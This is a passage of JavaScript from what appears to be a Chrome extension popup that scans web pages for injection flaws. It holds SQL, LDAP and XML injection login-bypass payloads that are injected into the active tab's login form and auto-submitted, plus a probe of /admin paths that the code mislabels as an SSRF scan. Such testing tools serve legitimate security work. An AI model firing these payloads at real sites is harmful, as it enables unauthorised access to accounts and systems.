            vulnerabilities.forEach((vuln) => {
                const cweNumber = parseCweNumber(vuln);
                if (cweNumber) {
                    buttonsHtml += `<button class="attackButton" data-cwe="${cweNumber}">CWE-${cweNumber}</button> `;
                }
            });
            buttonsHtml += "</div>";
            outputDiv.innerHTML += buttonsHtml;

            // Add event listeners to each attack button
            document.querySelectorAll(".attackButton").forEach((button) => {
                button.addEventListener("click", () => {
                    const cweNumber = button.getAttribute("data-cwe");
                    handleAttack(cweNumber, tab.id);
                });
            });
        } else {
            outputDiv.style.borderColor = "green";
            outputDiv.innerHTML = `✅ No injection vulnerabilities detected.`;
        }
    } catch (error) {
        console.error("Error checking for vulnerabilities:", error);
        outputDiv.style.borderColor = "red";
        outputDiv.innerHTML = `❌ Error occurred while checking for vulnerabilities.`;
    }
});

// === [3] HELPER FUNCTIONS FOR ATTACK BUTTONS ===

// A map of payloads for each CWE
const cweAttackPayloads = {
    // Example: SQL Injection (CWE-89)
    "89": {
        username: "1' OR '1'='1",
        password: "1' OR '1'='1",
    },
    // Example: LDAP Injection (CWE-90)
    "90": {
        username: "*admin)(|(uid=*))",
        password: "anything",
    },
    // Example: XML Injection (CWE-91)
    "91": {
        username: "admin' or '1'='1",
        password: "anything",
    },
    /*can add more payloads here, but due to time constraint only 3 are mentioned*/
};

/**
 * Extract the CWE number from a outputted CWEs:
 */
function parseCweNumber(vulnString) {
    const match = vulnString.match(/^CWE-(\d+)/);
    return match ? match[1] : null;
}

/**
 * Handle the attack for a specific CWE.
 * This will inject the payload into the current tab's login form.
 */
function handleAttack(cweNumber, tabId) {
    const payload = cweAttackPayloads[cweNumber];
    if (!payload) {
        console.warn(`No attack payload defined for CWE-${cweNumber}`);
        return;
    }

    chrome.scripting.executeScript({
        target: { tabId: tabId },
        func: fillFormFields,
        args: [payload.username, payload.password],
    });
}

/**
 * This function runs **in the context of the webpage** to fill the form fields.
 */
function fillFormFields(usernameValue, passwordValue) {
    const usernameField = document.querySelector("input[name='username']");
    const passwordField = document.querySelector("input[name='password']");
    if (usernameField && passwordField) {
        usernameField.value = usernameValue;
        passwordField.value = passwordValue;

        // Optionally submit the form automatically:
        const form = document.querySelector("form");
        if (form) {
            form.submit();
        }
    }
}

// Function to fill the login form with SQL injection payload
function fillSQLInjection(payload) {
    const usernameField = document.querySelector("input[name='username']");
    const passwordField = document.querySelector("input[name='password']");

    if (usernameField && passwordField) {
        usernameField.value = payload;
        passwordField.value = payload;

        // Optionally, submit the form automatically
        const form = document.querySelector("form");
        if (form) {
            form.submit();
        }
    }
}

/* ----------------------- Server-Side Request Forgery ----------------------- */
document.getElementById("scanSSRFButton").addEventListener("click", async () => {
    const outputDiv = document.getElementById("ssrfOutput");
    outputDiv.innerHTML = "🔍 Scanning for SSRF risks...";

    const potentialAPIs = ["/api/public-data", "/admin", "/restricted"];

    try {
        let [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

        chrome.scripting.executeScript(
            {
                target: { tabId: tab.id },
                func: async (urls) => {
                    let results = [];
                    for (let path of urls) {
                        try {
                            let response = await fetch(window.location.origin + path, { method: "GET" });
                            if (response.status === 200) {
                                results.push(`🚨 Open API detected: ${path}`);
                            } else if (response.status === 403) {
                                results.push(`⛔ Restricted page detected (403 Forbidden): ${path}`);
                            }
                        } catch (error) {
                            results.push(`❌ Error scanning ${path}: ${error}`);
                        }
                    }
                    return results;
                },
                args: [potentialAPIs]
            },
            (injectionResults) => {
                if (injectionResults && injectionResults[0].result) {
                    outputDiv.innerHTML = injectionResults[0].result.join("<br>") || "✅ No SSRF risks detected.";
                }
            }
        );
    } catch (error) {
        console.error("❌ SSRF scan failed:", error);
        outputDiv.innerHTML = "❌ SSRF scan failed.";
    }
});

/* ----------------------- Help Button ----------------------- */
document.getElementById("helpButton").addEventListener("click", () => {
    chrome.tabs.create({ url: "https://www.example.com/help" });
});
